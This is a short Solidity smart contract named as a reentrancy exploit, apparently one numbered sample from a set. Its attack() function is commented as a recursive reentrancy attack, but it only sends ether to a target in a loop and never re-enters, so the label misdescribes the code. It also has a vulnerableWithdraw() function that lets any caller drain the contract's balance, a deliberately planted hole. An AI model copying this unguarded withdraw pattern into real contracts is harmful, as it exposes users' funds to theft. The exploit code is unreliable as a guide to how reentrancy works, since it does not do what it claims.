pragma solidity ^0.8.0;

contract ReentrancyExploit6 {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function attack() public payable {
        // Exploit: Recursive reentrancy attack with decreasing value
        uint value = msg.value;
        while (value >= 1 ether) {
            (bool success, ) = target.call{value: 1 ether}("");
            require(success, "Call failed");
            value -= 1 ether;
        }
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function vulnerableWithdraw(uint amount) public {
        require(amount <= address(this).balance, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    fallback() external payable {}
}
